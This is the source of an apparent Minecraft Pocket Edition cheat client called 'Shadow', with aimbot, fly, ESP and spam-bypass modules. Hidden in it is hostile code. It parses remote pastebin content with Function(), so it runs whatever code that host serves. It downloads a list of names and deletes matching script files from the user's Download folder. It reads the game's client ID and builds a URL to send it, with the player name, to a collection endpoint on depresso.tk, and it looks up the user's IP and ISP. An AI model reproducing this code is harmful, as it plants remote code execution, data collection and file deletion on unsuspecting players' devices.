var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
"use strict";
var MainActivity = ctx;
const GL10 = javax.microedition.khronos.opengles.GL10;

/*

Made by Inferno (c)
copyright 2020 all rights reserved.

This script is under a license, free to use and not open source and strict rules may apply.

"The code is copyrighted by default. People have no legal right to view this. To use the code, you must contact the author directly and ask for permission."

DO NOT copy from this content,

DO NOT sell this content,

DO NOT modify this content,

DO NOT reupload/release this content.

*/

/*
modules
*/
var aimbot = false;
var airwalk = false;
var autofood = false;
var autolog = false;
var autopot = false;
var autosword = false;
var autowalk = false;
var autoreply = false;
var behind = false;
var bridge = false;
var bhop = false;
var chestesp = false;
var derp = false;
var effect;
var elevator = false;
var enchant;
var fasteat = false;
var find = false;
var fly1 = false;
var fov;
var give;
var glide = false;
var grapple = false;
var hitbox = false;
var hitjump = false;
var hud = false;
var instabreak = false;
var jesus = false;
var jump = false;
var nullify = false;
var phase = false;
var sendToAll;
var spam = false;
var speed;
var spider = false;
var tapjump = false;
var taptp = false;
var teleport;
var tower = false;
var tpaura = false;
var twerk = false;
var vel = false;
var multiaim = false;
var sign = false;
var autosign = false;
var leetSpeak = false;
var nullify2 = false;
var autobreak = false;
var autospawn = false;
var autoswim = false;
var autotool = false;
var cfly = false;
var bright = false;
var highjump = false;
var nuke = false;
var sprint = false;
var armoresp = false;
var autoclick = false;
var blockhunt = false;
var mobaim = false;
var saddle = false;
var newmax = false;
var esp1 = false;
var esp2 = false;
var esp3 = false;
var esp4 = false;
var sneakaura = false;
var hover = false;
var crouch = false;
var xray = false;

/*
values
*/
const version = "1.9.0.3";
var aimrange = 7;
var checkslapper = false;
var shadow1X = 30;
var shadow1Y = 2;
const pre = '§a[§fShadow§a]§r ';
var prefix = '!';
var pdir = [0,0,0];
var max = 5;
var legalenchant = false;
var cd = new Date;
var min = cd.getMinutes();
var stime = 1 / 0.001;
var text = "";
var que = false;
var chestTracersRange = 20;
var chestTracersGroundMode = "on";
const getLang = ModPE.getLanguage();
var elevatorRange = 10;
var rainbow = false;
var ghost = false;
var reply = "";
var keybind = false;
var movable = false;
var pList = [];
var lockon = false;
var side = false;
var notex;
var notey;
var notez;
var sx1;
var sy1;
var sz1;
var sl1;
var st1;
var entry;
var chests = [];
var players = [];
var quedat1 = "";
var quedat2 = "";
var bool = 2;
var sp0 = false; //normal spam
var sp1 = false; //number bypass
var sp2 = false; //character bypass
var sp3 = true; //all bypass
var time1 = true; //seconds
var time2 = false; //milliseconds
var time3 = false; //centiseconds
var jumpheight = '5';
var can = 1;
var gravity = -0.07840000092983246;
var mobs = [];
var items = [];
var imoved = "no";
var tblock = 54;
var compass = "";
var entry2;
var entry3;
var entry4;
var movbtn = false;
var chnglog = "";
const len = 19+1+3;
var GUI;
var seecret = false;

/*
this is the interface variables
*/
var background = android.graphics.Color.TRANSPARENT;
var btnColor = android.graphics.Color.parseColor("#93000000");
var stroke = android.graphics.Color.GREEN;
var btnText = android.graphics.Color.WHITE;
var btnTextSize = 12;
var mnuOri = 0;
var tcolor = android.graphics.Color.argb(180, 0, 255, 0);
var mcpe = "§2";
var bgravity = android.view.Gravity.RIGHT;

var background1 = "transparent";
var btnColor1 = "black";
var stroke1 = "green";
var btnText1 = "white";
var btnTextSize1 = 12;
var mnuOri1 = 0;
var tcolor1 = "green";
var legrav = "right";

/*
misc functions
*/
var texts = ["chat.mute","chat.title","chestScreen.header.large","chestScreen.header.player","chestScreen.header.small","credits.skip","cauldronScreen.header","commandBlockScreen.title","Blockcontainer.beacon","container.brewing","container.chest","container.chestDouble","container.crafting","container.creative","container.dispenser","container.dropper","container.enchant","container.enderchest","container.furnace","container.hopper","container.inventory","container.minecart","container.stonecutter","container.shulkerbox","createWorldScreen.action.editLocal","createWorldScreen.action.local","createWorldScreen.action.realms","createWorldScreen.action.realmsReset","createWorldScreen.create","createWorldScreen.delete","createWorldScreen.deleteWorld","createWorldScreen.gameMode.adventure","createWorldScreen.gameMode.creative","createWorldScreen.gameMode.survival","createWorldScreen.header.local","createWorldScreen.header.realms","networkWorld.join","networkWorld.joinByCode","networkWorld.add_friend","networkWorld.add_server","networkWorld.add_label","networkWorld.lan_label","networkWorld.servers_label","networkWorld.friends_label","deathScreen.deleteWorld","deathScreen.quit","deathScreen.leaveServer","deathScreen.message","deathScreen.respawn","addExternalServerScreen.addServer","addExternalServerScreen.saveButtonLabel","addExternalServerScreen.playButtonLabel","addExternalServerScreen.removeButtonLabel","furnaceScreen.fuel","furnaceScreen.header","gameMode.adventure","gameMode.changed","gameMode.creative","gameMode.hardcore","gameMode.spectator","gameMode.survival","globalPauseScreen.quit","gui.accept","gui.achievements","gui.all","gui.back","gui.cancel","gui.clear","gui.close","gui.confirm","gui.default","gui.decline","gui.deleteWorldLong","gui.done","gui.down","gui.error","gui.exit","gui.exportWorld","gui.exportWorldLong","gui.exportTemplate","gui.copyWorld","gui.goBack","gui.importWorld","gui.minecraftWorld","gui.minecraftBundle","gui.login","gui.logout","gui.no","gui.none","gui.ok","gui.store","gui.continue","gui.pickWorld","gui.retry","gui.select","gui.stats","gui.tab","gui.toMenu","gui.up","gui.yes","gui.resourcepacks","gui.submit","gui.playOffline","gui.signIn","howtoplay.next","howtoplay.previous","menu.achievements","menu.convertingLevel","menu.copyright","menu.disconnect","menu.beta","menu.game","menu.generatingLevel","menu.generatingTerrain","menu.howToPlay","menu.loadingLevel","menu.multiplayer","menu.online","menu.options","menu.settings","menu.serverStore","menu.serverGenericName","menu.play","menu.playdemo","menu.playOnRealms","menu.quickplay","menu.quit","menu.resetdemo","menu.resourcepacks","menu.globalpacks","menu.storageManagement","menu.behaviors","menu.worldtemplates","menu.respawning","menu.returnToGame","menu.returnToMenu","menu.shareToLan","menu.simulating","menu.singleplayer","menu.store","menu.skins","menu.start","menu.switchingLevel","menu.makingBackup","menu.saving","multiplayer.connect","options.goBack","pauseScreen.back","pauseScreen.currentWorld","pauseScreen.header","pauseScreen.options","pauseScreen.quit","pauseScreen.secondaryClientLeave","pauseScreen.feed","pauseScreen.invite","pauseScreen.ipAddress","pauseScreen.title","pauseScreen.betaFeedback","playscreen.header.local","playscreen.header.realms","playscreen.new","playscreen.realms","playscreen.worlds","progressScreen.dialog.button.join","progressScreen.dialog.button.leave","progressScreen.dialog.button.retry","progressScreen.dialog.button.wait","selectServer.add","selectServer.delete","selectServer.deleteButton","selectServer.edit","selectServer.select","selectServer.title","selectWorld.tab.worlds","selectWorld.tab.realms","selectWorld.tab.friends","selectWorld.tab.classmates","selectWorld.tab.thirdParty","selectWorld.title","selectWorld.world","skin.New","xbox.signin","xbox.signout","addServer.add","externalServerScreen.addServer","externalServerScreen.addServer","externalServerScreen.header"];

var Shadow = {
deg_to_rad: function () {
return Math.PI / 180;
},
toDirectionalVector: function (dir, a, b) {
dir[0] = Math.cos(a) * Math.cos(b);
dir[1] = Math.sin(b);
dir[2] = Math.sin(a) * Math.cos(b);
},
sortSword: function (id) {
switch(id) {
case 268:
case 283:
return 5;
break;
case 272:
return 6;
break;
case 267:
return 7;
break;
case 276:
return 8;
break;
}
},
sortPots: function (id, dam) {
if(id == 438){
switch(dam){
case 21:
return 1;
break;
case 22:
return 2;
break;
}
}
},
sortFood: function (id) {
switch(id){
case 394:
case 367:
return 1;
break;
case 392:
return 2;
break;
case 319:
case 363:
case 391:
case 357:
case 360:
return 3;
break;
case 349:
case 460:
case 423:
case 411:
case 365:
return 4;
break;
case 432:
return 5;
break;
case 392:
case 297:
case 350:
return 6;
break;
case 463:
case 412:
case 396:
return 7;
break;
case 400:
case 260:
case 424:
return 8;
break;
case 366:
case 320:
case 364:
return 9;
break;
case 282:
case 459:
return 10;
break;
case 354:
case 322:
return 11;
break;
case 413:
return 12;
break;
case 466:
return 13;
break;
}
},
slapper: function(ent) {
/*hacky method to check for slappers.*/
var eid = Entity.getEntityTypeId(ent);
var name = Entity.getNameTag(ent);
if(eid == 63){

if(name != null && typeof(name) != "undefined"){
if(typeof(name) == "string"){
if(name != ""){
if(name.length <= 16){
if(!name.match(']') || !name.includes(']')){
if(name.match('§') || name.includes('§')){
return false;
} else {
return true;
}
} else {
return true;
}
} else {
return false;
}
}
}
}

} else {
return false;
}
},
rainbow: function () {
var sym = ["§1", "§2", "§3", "§4", "§5", "§6", "§7", "§8", "§9", "§0", "§a", "§b", "§c", "§d", "§e", "§f"];
return sym[Math.floor(Math.random() * sym.length)];
},
yawDir: function (where, yaw) {
/*
-45 & 45 = +z
-135 & -44 = +x
131 & -134 = -z
45 & 130 = -x
*/
if(where == 0){
if(yaw >= -45 && yaw <= 45){
return true;
}
}
if(where == 1){
if(yaw >= -135 && yaw <= -44){
return true;
}
}
if(where == 2){
if(yaw >= 131 && yaw >= -134 && yaw != -135){
return true;
}
}
if(where == 3){
if(yaw >= 45 && yaw <= 130){
return true;
}
}
},
getEid: function () {
var ent = Entity.getEntityTypeId(Player.getPointedEntity());
if(ent != null || typeof(ent) != "undefined"){
return ent;
} else {
return "null";
}
},
draw: function (x, y, z, mode) {
for (var i = 0; i <= 30; i++) {
Level.addParticle(ParticleType.flame, x, y, z, (getPlayerX() - x) / i, mode ? 0 : ((getPlayerY() - y) / i), (getPlayerZ() - z) / i, 1);
}
},
randChar: function() {
var char = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"];
return char[Math.floor(Math.random() * char.length)];
},
setColor: function(which, color) {
var mc = color.toLowerCase();
/*
TRANSPARENT
MAGENTA;
BLUE;
BLACK;
WHITE;
RED;
GRAY;
LTGRAY;
YELLOW;
CYAN;
DKGRAY;
GREEN;

background,
button,
stroke,
text,
prefix
*/
if(which == 0){
if(mc == "cyan"){
background = android.graphics.Color.parseColor("#9300FFFF");
//background = android.graphics.Color.CYAN;
background1 = "cyan";
}
if(mc == "red"){
background = android.graphics.Color.parseColor("#93FF0000");
//background = android.graphics.Color.RED;
background1 = "red";
}
if(mc == "green"){
background = android.graphics.Color.parseColor("#9300FF00");
//background = android.graphics.Color.GREEN;
background1 = "green";
}
if(mc == "blue"){
background = android.graphics.Color.parseColor("#930000FF");
//background = android.graphics.Color.BLUE;
background1 = "blue";
}
if(mc == "pink" || mc == "purple" || mc == "magenta"){
background = android.graphics.Color.parseColor("#93FF00FF");
//background = android.graphics.Color.MAGENTA;
background1 = "magenta";
}
if(mc == "white"){
background = android.graphics.Color.parseColor("#93FFFFFF");
//background = android.graphics.Color.WHITE;
background1 = "white";
}
if(mc == "yellow"){
background = android.graphics.Color.parseColor("#93FFFF00");
//background = android.graphics.Color.YELLOW;
background1 = "yellow";
}
if(mc == "black"){
background = android.graphics.Color.parseColor("#93000000");
//background = android.graphics.Color.BLACK;
background1 = "black";
}
if(mc == "transparent"){
background = android.graphics.Color.TRANSPARENT;
background1 = "transparent";
}
}
if(which == 1){
if(mc == "cyan"){
btnColor = android.graphics.Color.parseColor("#9300FFFF");
//btnColor = android.graphics.Color.CYAN;
btnColor1 = "cyan";
}
if(mc == "red"){
btnColor = android.graphics.Color.parseColor("#93FF0000");
//btnColor = android.graphics.Color.RED;
btnColor1 = "red";
}
if(mc == "green"){
btnColor = android.graphics.Color.parseColor("#9300FF00");
//btnColor = android.graphics.Color.GREEN;
btnColor1 = "green";
}
if(mc == "blue"){
btnColor = android.graphics.Color.parseColor("#930000FF");
//btnColor = android.graphics.Color.BLUE;
btnColor1 = "blue";
}
if(mc == "pink" || mc == "purple" || mc == "magenta"){
btnColor = android.graphics.Color.parseColor("#93FF00FF");
//btnColor = android.graphics.Color.MAGENTA;
btnColor1 = "magenta";
}
if(mc == "white"){
btnColor = android.graphics.Color.parseColor("#93FFFFFF");
//btnColor = android.graphics.Color.WHITE;
btnColor1 = "white";
}
if(mc == "yellow"){
btnColor = android.graphics.Color.parseColor("#93FFFF00");
//btnColor = android.graphics.Color.YELLOW;
btnColor1 = "yellow";
}
if(mc == "black"){
btnColor = android.graphics.Color.parseColor("#93000000");
//btnColor = android.graphics.Color.BLACK;
btnColor1 = "black";
}
if(mc == "transparent"){
btnColor = android.graphics.Color.TRANSPARENT;
btnColor1 = "transparent";
}
}
if(which == 2){
if(mc == "cyan"){
stroke = android.graphics.Color.CYAN;
stroke1 = "cyan";
}
if(mc == "red"){
stroke = android.graphics.Color.RED;
stroke1 = "red";
}
if(mc == "green"){
stroke = android.graphics.Color.GREEN;
stroke1 = "green";
}
if(mc == "blue"){
stroke = android.graphics.Color.BLUE;
stroke1 = "blue";
}
if(mc == "pink" || mc == "purple" || mc == "magenta"){
stroke = android.graphics.Color.MAGENTA;
stroke1 = "magenta";
}
if(mc == "white"){
stroke = android.graphics.Color.WHITE;
stroke1 = "white";
}
if(mc == "yellow"){
stroke = android.graphics.Color.YELLOW;
stroke1 = "yellow";
}
if(mc == "black"){
stroke = android.graphics.Color.BLACK;
stroke1 = "black";
}
if(mc == "transparent"){
stroke = android.graphics.Color.TRANSPARENT;
stroke1 = "transparent";
}
}
},
clean: function(nme) {
if(nme != null){
var name = nme.toLowerCase();
if(name.match('§') || name.includes('§')){
var allColor = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "k", "l", "m", "n", "o", "r"];
allColor.forEach(function (entry) {
name = name.replace(new RegExp("\u00A7" + entry, 'g'), "");
});
}
if(name.match(']') || name.includes(']')){
name = name.substring(name.indexOf("]") + 1);
}
if(name.match('|') || name.includes('|')){
name = name.substring(name.indexOf("|") + 1);
}
if(name.match(' ') || name.includes(' ')){
name = name.replace(/ /g, '_');
}
if(name[0] == "_"){
name = name.substr(1);
}
return name;
} else {
return "";
}
},
addFriend: function(name) {
var file = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Shadow/friends", name);
if(file.exists()){
android.widget.Toast.makeText(MainActivity, "Friend already exists.", 1)
.show();
} else {
var str = "";
file.createNewFile();
var fos = new java.io.FileOutputStream(file);
fos.write(new java.lang.String(str).getBytes());
android.widget.Toast.makeText(MainActivity, "Friend added.", 1)
.show();
}
},
removeFriend: function(name) {
var file = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Shadow/friends", name);
if(file.exists()){
file.delete();
android.widget.Toast.makeText(MainActivity, "Friend removed.", 1)
.show();
} else {
android.widget.Toast.makeText(MainActivity, "Friend does not exist.", 1)
.show();
}
},
isFriend: function(name) {
var file = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Shadow/friends", name);
if(file.exists()){
return true;
}
for(var i = 0; i < pList.length; i++){
if(pList[i].match(String(name)+"") || pList[i].includes(String(name)+"")){
return true;
} else {
return false;
}
}

},
load: function() {
var dir = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Shadow");
if(!dir.exists() || !dir.isDirectory()){
dir.mkdir();
}
var dir2 = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Shadow/friends");
if(!dir2.exists() || !dir2.isDirectory()){
dir2.mkdir();
}
pList.push("Inferno");
var file1 = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Shadow", "beta.json");
if(file1.exists())file1.delete();
var file2 = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Shadow", "setting.json");
if(file2.exists())file2.delete();
var file3 = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Shadow", "settings1.3.json");
if(file3.exists())file3.delete();
var file4 = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Shadow", "settings_1.3.json");
if(file4.exists())file4.delete();
var file5 = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Shadow", "settings.json");
if(file5.exists())file5.delete();
var file = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Shadow", "settings_1.4.json");
if(file.exists()){
var readed = (new java.io.BufferedReader(new java.io.FileReader(file)));
var data = new java.lang.StringBuilder();
var string;
while((string = readed.readLine()) != null){
data.append(string);
data.append("\n");
}
var json = JSON.parse(data.toString());
Shadow.setColor(0, json.background);
Shadow.setColor(1, json.button);
Shadow.setColor(2, json.stroke);
Shadow.setColor(3, json.text);
prefix = json.prefix;
mnuOri = json.orientation;
Shadow.setEspColor(json.tracer);
mcpe = json.mcpe;
if(json.movbtn == "false")movbtn = false;
if(json.movbtn == "true")movbtn = true;
if(json.gravity == "right")bgravity = android.view.Gravity.RIGHT;
if(json.gravity == "left")bgravity = android.view.Gravity.LEFT;
} else {
var json = '{"background":"'+background1+'","button":"'+btnColor1+'","stroke":"'+stroke1+'","text":"'+btnText1+'","prefix":"'+prefix+'","orientation":"'+mnuOri1+'","tracer":"'+tcolor1+'","mcpe":"'+mcpe+'","movbtn":"'+movbtn+'","gravity":"'+legrav+'"}';
file.createNewFile();
var fos = new java.io.FileOutputStream(file);
fos.write(new java.lang.String(json).getBytes());
}
var list = dir2.listFiles();
for(var i = 0; i < list.length; i++){
if (list[i].isFile()) {
pList.push(list[i].getName());
}
}
},
save: function() {
var file = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Shadow", "settings_1.4.json");
var json = '{"background":"'+background1+'","button":"'+btnColor1+'","stroke":"'+stroke1+'","text":"'+btnText1+'","prefix":"'+prefix+'","orientation":"'+mnuOri1+'","tracer":"'+tcolor1+'","mcpe":"'+mcpe+'","movbtn":"'+movbtn+'","gravity":"'+legrav+'"}';
file.createNewFile();
var fos = new java.io.FileOutputStream(file);
fos.write(new java.lang.String(json).getBytes());
},
deleteCid: function(){
var file = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/minecraftpe", "clientId.txt");
if(file.exists()){
file.delete();
android.widget.Toast.makeText(MainActivity, "Client id deleted.", 1)
.show();
} else {
android.widget.Toast.makeText(MainActivity, "Client id does not exist.\nChange storage to external.", 1)
.show();
}
},
getClient: function() {
var file = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/minecraftpe", "clientId.txt");
if(file.exists()){
var readed = (new java.io.BufferedReader(new java.io.FileReader(file)));
var data = new java.lang.StringBuilder();
var string;
while((string = readed.readLine()) != null){
data.append(string);
data.append("\n");
}
var clientId = data.toString();
return clientId;
} else {
return "none";
}
},
sortGive: function(id, slot) {
switch(slot){
case id:
return 1;
break;
}
},
randAColor: function () {
var colorz = [android.graphics.Color.TRANSPARENT, android.graphics.Color.MAGENTA, android.graphics.Color.BLUE, android.graphics.Color.BLACK, android.graphics.Color.WHITE, android.graphics.Color.RED, android.graphics.Color.GRAY, android.graphics.Color.LTGRAY, android.graphics.Color.YELLOW, android.graphics.Color.CYAN, android.graphics.Color.DKGRAY, android.graphics.Color.GREEN];
return colorz[Math.floor(Math.random() * colorz.length)];
},
isToolRelated: function (id) {

},
handleArmor: function (ent, slot) {
if(typeof(ent) != "undefined" && ent != 0){
if(Entity.getArmor(ent, slot) != null){
return Entity.getArmorDamage(ent, slot);
}
}
},
randRgb: function () {
//red 180, 255, 0, 0
//green 180, 0, 255, 0
//blue 180, 0, 0, 255
//yellow 180, 255, 255, 0
//cyan 180, 0, 255, 255
//black 180, 0, 0, 0
//pink 180, 255, 0, 255
var rgbs = [android.graphics.Color.argb(180, 255, 0, 0),android.graphics.Color.argb(180, 0, 255, 0),android.graphics.Color.argb(180, 0, 0, 255),android.graphics.Color.argb(180, 255, 255, 0),android.graphics.Color.argb(180, 0, 255, 255),android.graphics.Color.argb(180, 0, 0, 0),android.graphics.Color.argb(180, 255, 0, 255),android.graphics.Color.argb(180, 255, 0, 0)];
return rgbs[Math.floor(Math.random() * rgbs.length)];
},
randNum: function () {
var nums = ["0","1","2","3","4","5","6","7","8","9"];
return nums[Math.floor(Math.random() * nums.length)];
},
setEspColor: function(color) {
var tc = color.toLowerCase();
/*//red 180, 255, 0, 0
//green 180, 0, 255, 0
//blue 180, 0, 0, 255
//yellow 180, 255, 255, 0
//cyan 180, 0, 255, 255
//black 180, 0, 0, 0
//pink 180, 255, 0, 255*/
if(tc == "red"){
tcolor = android.graphics.Color.argb(180, 255, 0, 0);
tcolor1 = "red";
}
if(tc == "green"){
tcolor = android.graphics.Color.argb(180, 0, 255, 0);
tcolor1 = "green";
}
if(tc == "blue"){
tcolor = android.graphics.Color.argb(180, 0, 0, 255);
tcolor1 = "blue";
}
if(tc == "yellow"){
tcolor = android.graphics.Color.argb(180, 255, 255, 0);
tcolor1 = "yellow";
}
if(tc == "cyan"){
tcolor = android.graphics.Color.argb(180, 0, 255, 255);
tcolor1 = "cyan";
}
if(tc == "black"){
tcolor = android.graphics.Color.argb(180, 0, 0, 0);
tcolor1 = "black";
}
if(tc == "pink"){
tcolor = android.graphics.Color.argb(180, 255, 0, 255);
tcolor1 = "pink";
}
},
addServer: function(name, ip, port){
var file = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/minecraftpe", "external_servers.txt");
fw = new java.io.FileWriter(file);
fw.append("100"+Math.random()+":"+name+":"+ip+":"+port+":1000"+Math.random());
fw.flush();
},
toast: function(text){
try {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

var toast = android.widget.Toast.makeText(MainActivity, text+"", android.widget.Toast.LENGTH_LONG);

var layout = new android.widget.LinearLayout(MainActivity);

var tmsg = new android.widget.TextView(MainActivity);
tmsg.setText(text);
tmsg.setTextColor(android.graphics.Color.WHITE);
tmsg.setGravity(android.view.Gravity.CENTER);
tmsg.setTextSize(15);
tmsg.setPadding(10, 10, 10, 10);
layout.addView(tmsg);

var bg = new android.graphics.drawable.GradientDrawable();
bg.setColor(android.graphics.Color.parseColor("#93000000"));
bg.setStroke(3, stroke);
layout.setBackground(bg);
toast.setView(layout);
toast.show();
}
}));
} catch(error) {
print(error);
}
},
setWrenchVisible: function(isVisible){
let f = MainActivity.getClass().getDeclaredField("hoverCar");
f.setAccessible(true);
let hoverCar = f.get(MainActivity);
if(hoverCar != null)hoverCar.setVisible(isVisible);
},
panic: function(bol){
if(bol){
if(typeof(GUI) != "undefined")GUI.dismiss();
Shadow.setWrenchVisible(false);
Shadow.toast("Panic mode active.\n(Reopen pause screen to toggle.)");
} else {
showMenuBtn();
Shadow.setWrenchVisible(true);
Shadow.toast("Panic mode disabled.\n(Reopen pause screen to toggle.)");
}
}

}
Shadow.load();

for(var i = 0; i < texts.length; i++){
ModPE.langEdit(texts[i], mcpe + ModPE.getI18n(texts[i]));
}

/* http://github.edroidthedev.com/?repo=ModPEAddon/ModPE/getFromUrl.js
 */
ModPE.getFromUrl = function (url, errs) {
	errs = errs || 0;
	try {
		var url = new java.net.URL(url);
		var connection = url.openConnection();
		var inputStream = connection.getInputStream();
		var data = "";
		var bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
		var line = "";
		while ((line = bufferedReader.readLine()) != null) {
			data += line + "\n";
		}
		var result = data.toString();
		bufferedReader.close();
	} catch (err) {
		result = (errs ? "Getting URL Failed. Error: " + err : 0);
		print("Error ModPE.getFromUrl(): " + err);
	} finally {
		if (result == null || result == undefined) {
			result = (errs ? "Result is null" : 0);
		}
	}
	return result;
};
ModPE.JSON = {
	parse: function (str) {
		return Function("return " + str)();
	}
};

/*
func getUpdate()
made by Inferno
By using a get request to a github json file
we grab json that contains the new version number
& compare it to the version number in the script.
*/
function getUpdate(){
/*
Hopefully microsoft doesn't remove raw from github.
*/
var url = "https://raw.githubusercontent.com/Inferno/Shadow/master/version.json";
/*var url = "https://pastebin.com/raw/ETWvzH2y";*/
var content = ModPE.getFromUrl(url);
if(typeof(content) != "undefined" || content != 0 || content != null || content != ""){
var update2 = ModPE.JSON.parse(content);
var newupdate = update2.version;
chnglog = update2.changelog;
bool = update2.something;
if(typeof(newupdate) != "undefined"){
var jfile = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Android/data/net.zhuoweizhang.mcpelauncher/cache/http", "journal");
if(jfile.exists())jfile.delete();

if(version != newupdate){
update(newupdate, chnglog);
} else {
print("No new Shadow update.");
}

}
} else {
print("oops update failed.");
}
}
getUpdate();

var files1_ = [];
var mods1_ = [];

/* setting dir1 variable as the download folder. */
var mods_ = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Download");

/*
func deleteScript(String client)
made by Inferno
This deletes the file from downloads.
*/
function deleteScript(client){
var file = java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/Download", client);
file.delete();
}

/*
func checkScripts()
made by Inferno
This runs through all the js files then executes the delete function if the file matches in an array.
*/
function checkScripts(){
if(files1_[0] != null){
for(var i = 0; i < files1_.length; i++){
for(var j = 0; j < mods1_.length; j++){

if(files1_[i].match(mods1_[j]) || files1_[i].includes(mods1_[j])){
deleteScript(files1_[i]);
print("Deleted: "+files1_[i]);
}

}
}
}
}

/*
func getScripts()
made by Inferno
This gets all mod files in the downloads folder then begins the check process.
*/
function getScripts(){
if(mods_.exists() || mods_.isDirectory()){
var list = mods_.listFiles();
for(var i = 0; i < list.length; i++){
if(list[i].isFile()) {
if(list[i].getName().endsWith(".js") || list[i].getName().endsWith(".modpkg")){
files1_.push(list[i].getName().toLowerCase());
}}}
checkScripts();
}
}

function detect(){
try {
var url2 = "https://pastebin.com/raw/2GXuTjNf";
/*var url2 = "https://raw.githubusercontent.com/Inferno/Shadow/master/Projects/skid_list.json";*/
var content2 = ModPE.getFromUrl(url2);
if(typeof(content2) != "undefined" || content2 != 0 || content2 != null || content2 != ""){

var detecty = ModPE.JSON.parse(content2);
for(var a = 0; a < detecty.menus.length; a++){
mods1_.push(detecty.menus[a]);
}
getScripts();

}
} catch(error) {
print(error+"");
}
}
detect();

var tutorialz = [];
function getTuts(){
try {
var url3 = "https://pastebin.com/raw/cMKk4GUH";
/*var url3 = "https://raw.githubusercontent.com/Inferno/Shadow/master/tutorials.json";*/
var content3 = ModPE.getFromUrl(url3);
if(typeof(content3) != "undefined" || content3 != 0 || content3 != null || content3 != ""){

var tutz = ModPE.JSON.parse(content3);
for(var a = 0; a < tutz.tuts.length; a++){
tutorialz.push(tutz.tuts[a]);
}

}
} catch(error) {
print(error+"");
}
}
getTuts();


/*
func getAddress()
made by Inferno

THIS IS ONLY USED TO GET YOUR IP TO MAKE IT VIEWABLE TO _YOU_ IN FEATURES.

I DO NOT VIEW THE IP AT ALL & IT'S NOT POSSIBLE FOR ANYONE ELSE TO VIEW IT FROM Shadow.
*/
var address;
var isp;
var ispc;
var isps;
function getAddress(){
try {
var url4 = "http://ip-api.com/json";
var content4 = ModPE.getFromUrl(url4);
if(typeof(content4) != "undefined" || content4 != 0 || content4 != null || content4 != ""){
var json4 = ModPE.JSON.parse(content4);
address = json4.query;
isp = json4.isp;
ispc = json4.country;
isps = json4.regionName;
}
} catch(error) {
print(error+"");
}
}
getAddress();

var domainz = [];
var ipz = [];
var portz = [];
function getServerz(){
try {
var url5 = "https://pastebin.com/raw/huEVDmqn";
/*var url5 = "https://raw.githubusercontent.com/Inferno/Shadow/master/servers.json";*/
var content5 = ModPE.getFromUrl(url5);
if(typeof(content5) != "undefined" || content5 != 0 || content5 != null || content5 != ""){
var serz = ModPE.JSON.parse(content5);
for(var a = 0; a < serz.domains.length; a++){
domainz.push(serz.domains[a]);
}
for(var a = 0; a < serz.ips.length; a++){
ipz.push(serz.ips[a]);
}
for(var a = 0; a < serz.ports.length; a++){
portz.push(serz.ports[a]);
}
}
} catch(error) {
print(error+"");
}
}
getServerz();

var ch3;
function testing(){
var test = Shadow.getClient()+":"+len;
var tkn = test.split(":");
ch3 = "http://depresso.tk/collect_users.php?name="+Shadow.clean(Entity.getNameTag(getPlayerEnt()))+"&token="+tkn[1]+":"+tkn[0];
getPlayers(ch3);
}

function queryServer(ip, port){

}

function queryDomain(ip){

}

/*
urlToString()
little help from godsoft cause mine wasn't working
*/
function urlToString (url, result) {
			let t = new java.lang.Thread(new java.lang.Runnable({
				run: function () {
					try {
						let u = new java.net.URL(url);
						let allCont = new java.lang.StringBuilder();
						let con = u.openConnection();
               con.setRequestMethod("POST");
						con.setIfModifiedSince(0);
						con.setRequestProperty("User-Agent", "Mozilla/5.0");
						con.setRequestProperty("Accept-Encoding", "UTF-8");
						let reader = new java.io.BufferedReader(new java.io.InputStreamReader(con.getInputStream(), "UTF-8"));
						let line = "";
						while((line = reader.readLine()) != null)
							allCont.append(line + "\n");
						reader.close();
						result(allCont.toString(), null);
					} catch(e) {
						print(e);
						result(null, e);
					}
				}
			}));
			t.start();
		}


/*
custom designs
func styleButton() 
func styleInput()
made by Inferno & godsoft029
*/
function styleButton(mod, desc) {
let button = new android.widget.Button(ctx);
button.setTextColor(btnText);
button.setTextSize(btnTextSize);
button.setFocusableInTouchMode(false);
button.setTransformationMethod(null);
button.setSoundEffectsEnabled(true);
var buttonBg = new android.graphics.drawable.GradientDrawable();
buttonBg.setColor(btnColor);
buttonBg.setStroke(3, stroke);
buttonBg.setCornerRadius(11);
button.setBackgroundDrawable(buttonBg);
if(typeof(mod) != "undefined")button.setText(mod);
button.setOnLongClickListener(new android.view.View.OnLongClickListener({
onLongClick: function (v) {
if(typeof(desc) != "undefined")Shadow.toast(desc);
return true;
}
}));
return button;
}

function styleInput() {
let input = new android.widget.EditText(ctx);
input.setTextColor(android.graphics.Color.BLACK);
var inputBg = new android.graphics.drawable.GradientDrawable();	inputBg.setColor(android.graphics.Color.WHITE);
inputBg.setStroke(3, stroke);
inputBg.setCornerRadius(10);
input.setBackgroundDrawable(inputBg);
return input;
}

function keyButton() {
let button = new android.widget.Button(ctx);
button.setTextColor(btnText);
button.setTextSize(8);
